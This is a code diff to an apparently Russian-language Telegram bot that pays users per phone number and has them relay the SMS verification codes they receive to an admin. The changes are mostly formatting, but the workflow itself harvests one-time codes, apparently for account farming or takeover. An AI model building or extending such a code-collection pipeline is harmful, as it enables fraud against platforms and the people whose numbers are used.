@@ -97,7 +97,7 @@ async def cmd_start(message: types.Message):
     channel_link = get_channel_link()
     
     await message.answer(
-        f"🔐 <b>JetMax - твое богатое будущее!</b>\nДля дальнейшей работы с ботом подпишитесь на канал: {channel_link}",
+        f"<b>🔐 JetMax - твое богатое будущее!</b>\n<i>Для дальнейшей работы с ботом подпишитесь на канал:</i> {channel_link}",
         reply_markup=get_main_keyboard(),
         parse_mode="HTML"
     )
@@ -114,12 +114,12 @@ async def show_balance(message: types.Message):
 
 @dp.message(Command("menu"))
 async def cmd_menu(message: types.Message):
-    await message.answer("Меню:", reply_markup=get_main_keyboard())
+    await message.answer("<b>Меню:</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
 
 @dp.message(Command("admin"))
 async def admin_panel(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        await message.answer("⛔ Доступ запрещен")
+        await message.answer("<b>⛔ Доступ запрещен</b>", parse_mode="HTML")
         return
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -127,7 +127,7 @@ async def admin_panel(message: types.Message):
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")]
     ])
     await message.answer(
-        "<b>👨‍💼 Админ панель</b>\nВыберите действие:",
+        "<b>👨‍💼 Админ панель</b>\n<i>Выберите действие:</i>",
         reply_markup=keyboard,
         parse_mode="HTML"
     )
@@ -153,8 +153,8 @@ async def admin_create(callback: types.CallbackQuery):
         )
         await callback.answer("✅ Заявка создана")
     except Exception as e:
-        await callback.answer(f"❌ Ошибка: {e}")
-        await callback.message.answer(f"Ошибка отправки в канал: {e}")
+        await callback.answer(f"❌ Ошибка")
+        await callback.message.answer(f"<b>❌ Ошибка отправки в канал:</b>\n<code>{e}</code>", parse_mode="HTML")
 
 @dp.callback_query(F.data == "admin_stats")
 async def admin_stats(callback: types.CallbackQuery):
@@ -170,10 +170,10 @@ async def admin_stats(callback: types.CallbackQuery):
         
     await callback.message.answer(
         f"<b>📊 Статистика</b>\n\n"
-        f"👥 Пользователей: <code>{users_count}</code>\n"
-        f"✅ Выполнено заявок: <code>{approved_count}</code>\n"
-        f"🔄 Активных заявок: <code>{active_requests}</code>\n"
-        f"💰 Выплачено: <code>{total_payout or 0:.2f} USDT</code>",
+        f"<i>👥 Пользователей:</i> <code>{users_count}</code>\n"
+        f"<i>✅ Выполнено заявок:</i> <code>{approved_count}</code>\n"
+        f"<i>🔄 Активных заявок:</i> <code>{active_requests}</code>\n"
+        f"<i>💰 Выплачено:</i> <code>{total_payout or 0:.2f} USDT</code>",
         parse_mode="HTML"
     )
     await callback.answer()
@@ -182,6 +182,9 @@ async def admin_stats(callback: types.CallbackQuery):
 async def call_send_number(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     username = callback.from_user.username or callback.from_user.full_name
+    
+    await callback.message.answer("🔄 Перенаправление в личные сообщения...")
+    
     async with db_pool.acquire() as conn:
         user = await conn.fetchrow("SELECT current_number, number_timestamp FROM users WHERE user_id = $1", user_id)
         if user and user["current_number"]:
@@ -192,16 +195,24 @@ async def call_send_number(callback: types.CallbackQuery, state: FSMContext):
                     remaining = 600 - elapsed
                     minutes = remaining // 60
                     seconds = remaining % 60
-                    await callback.message.answer(f"⏳ Этот номер недавно обрабатывался.\nЕго можно поставить повторно только через {minutes:02d}:{seconds:02d}")
+                    await bot.send_message(
+                        user_id,
+                        f"<b>⏳ Этот номер недавно обрабатывался</b>\n<i>Его можно поставить повторно только через</i> <code>{minutes:02d}:{seconds:02d}</code>",
+                        parse_mode="HTML"
+                    )
                     await callback.answer()
                     return
+    
     await state.set_state(Form.waiting_number)
     await state.update_data(user_id=user_id, username=username)
+    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отменить", callback_data="cancel_request")]
     ])
-    await callback.message.answer(
-        "<b>⏱️ Заявка принята!</b>\nОтправьте ниже свой номер в любом формате.\nТаймер на выполнение: 1 мин",
+    
+    await bot.send_message(
+        user_id,
+        "<b>⏱️ Заявка принята!</b>\n<i>Отправьте ниже свой номер в любом формате</i>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
         reply_markup=keyboard,
         parse_mode="HTML"
     )
@@ -215,7 +226,7 @@ async def timeout_number(user_id: int, state: FSMContext):
         data = await state.get_data()
         if data.get("user_id") == user_id:
             await state.clear()
-            await bot.send_message(user_id, "⏰ Время вышло. Заявка отменена.")
+            await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
 
 @dp.callback_query(F.data == "cancel_request")
 async def cancel_request(callback: types.CallbackQuery, state: FSMContext):
@@ -226,10 +237,10 @@ async def cancel_request(callback: types.CallbackQuery, state: FSMContext):
         await state.clear()
     async with db_pool.acquire() as conn:
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
-    await callback.message.answer("❌ Заявка отменена")
+    await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
     await bot.send_message(
         ADMIN_ID,
-        f"<b>🔐 Заявка отменена!</b>\nПользователь: @{username} [{user_id}]\nНомер заявки: #отменено",
+        f"<b>🔐 Заявка отменена!</b>\n<i>Пользователь:</i> @{username} [<code>{user_id}</code>]\n<i>Номер заявки:</i> <code>#отменено</code>",
         parse_mode="HTML"
     )
     await callback.answer()
@@ -255,11 +266,11 @@ async def process_number(message: types.Message, state: FSMContext):
     ])
     await bot.send_message(
         ADMIN_ID,
-        f"<b>💼 Новая заявка от @{username} (ID: {user_id})</b>\nНомер: <code>{number}</code>",
+        f"<b>💼 Новая заявка от @{username} (ID: {user_id})</b>\n<i>Номер:</i> <code>{number}</code>",
         reply_markup=keyboard,
         parse_mode="HTML"
     )
-    await message.answer("✅ Номер принят, ожидайте решения администратора")
+    await message.answer("<b>✅ Номер принят</b>\n<i>Ожидайте решения администратора</i>", parse_mode="HTML")
 
 @dp.callback_query(F.data.startswith("request_sms_"))
 async def request_sms(callback: types.CallbackQuery, state: FSMContext):
@@ -271,7 +282,7 @@ async def request_sms(callback: types.CallbackQuery, state: FSMContext):
     ])
     await bot.send_message(
         user_id,
-        "<b>⏱️ Введите код из смс!</b>\nТаймер на выполнение: 1 мин",
+        "<b>⏱️ Введите код из смс!</b>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
         reply_markup=keyboard,
         parse_mode="HTML"
     )
@@ -287,7 +298,7 @@ async def timeout_sms(user_id: int, state: FSMContext):
         data = await state.get_data()
         if data.get("user_id") == user_id:
             await state.clear()
-            await bot.send_message(user_id, "⏰ Время вышло. Заявка отменена.")
+            await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
 
 @dp.callback_query(F.data.startswith("reject_"))
 async def reject_request(callback: types.CallbackQuery):
@@ -296,7 +307,7 @@ async def reject_request(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
     await bot.send_message(
         user_id,
-        "<b>🔐 Заявка отклонена!</b>\nПричина: отклонена администрацией",
+        "<b>🔐 Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>",
         parse_mode="HTML"
     )
     await callback.answer("Заявка отклонена")
@@ -312,7 +323,7 @@ async def process_sms(message: types.Message, state: FSMContext):
     async with db_pool.acquire() as conn:
         row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
         if not row:
-            await message.answer("Заявка не найдена")
+            await message.answer("<b>❌ Заявка не найдена</b>", parse_mode="HTML")
             await state.clear()
             return
         number = row["number"]
@@ -325,11 +336,11 @@ async def process_sms(message: types.Message, state: FSMContext):
     ])
     await bot.send_message(
         ADMIN_ID,
-        f"<b>👨‍💻 Получен код!</b>\nПользователь: @{username} [{user_id}]\nКод: <code>{sms_code}</code>",
+        f"<b>👨‍💻 Получен код!</b>\n<i>Пользователь:</i> @{username} [<code>{user_id}</code>]\n<i>Код:</i> <code>{sms_code}</code>",
         reply_markup=keyboard,
         parse_mode="HTML"
     )
-    await message.answer("✅ Код отправлен администратору")
+    await message.answer("<b>✅ Код отправлен администратору</b>", parse_mode="HTML")
 
 @dp.callback_query(F.data.startswith("accept_"))
 async def number_accepted(callback: types.CallbackQuery):
@@ -353,7 +364,7 @@ async def number_accepted(callback: types.CallbackQuery):
         await conn.execute("UPDATE users SET balance = balance + 4.00 WHERE user_id = $1", user_id)
     await bot.send_message(
         user_id,
-        f"<b>🎉 Номер принят!</b>\nВам успешно 4.0$ на баланс.\n\nНомер заявки: #{request_number}",
+        f"<b>🎉 Номер принят!</b>\n<i>Вам успешно</i> <code>4.0$</code> <i>на баланс</i>\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
         parse_mode="HTML"
     )
     await callback.answer("Номер принят")
@@ -366,7 +377,7 @@ async def number_registered(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
     await bot.send_message(
         user_id,
-        "<b>🔐 Номер уже зарегистрирован!</b>\nОжидайте создания следующей заявки в канале.",
+        "<b>🔐 Номер уже зарегистрирован!</b>\n<i>Ожидайте создания следующей заявки в канале</i>",
         parse_mode="HTML"
     )
     await callback.answer("Номер зарегистрирован")
@@ -375,7 +386,7 @@ async def number_registered(callback: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("error_"))
 async def got_error(callback: types.CallbackQuery):
     user_id = int(callback.data.split("_")[1])
-    await callback.message.answer("Введите причину ошибки:")
+    await callback.message.answer("<b>Введите причину ошибки:</b>", parse_mode="HTML")
     await callback.answer()
     
     @dp.message
@@ -390,7 +401,7 @@ async def got_error(callback: types.CallbackQuery):
             f"<b>🔐 {reason}</b>",
             parse_mode="HTML"
         )
-        await message.answer("Причина отправлена")
+        await message.answer("<b>✅ Причина отправлена</b>", parse_mode="HTML")
         dp.message.handlers.remove(get_error_reason)
 
 @dp.callback_query(F.data == "cancel_sms")
@@ -399,7 +410,7 @@ async def cancel_sms(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
     async with db_pool.acquire() as conn:
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
-    await callback.message.answer("❌ Заявка отменена")
+    await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
     await callback.answer()
 
 async def main():
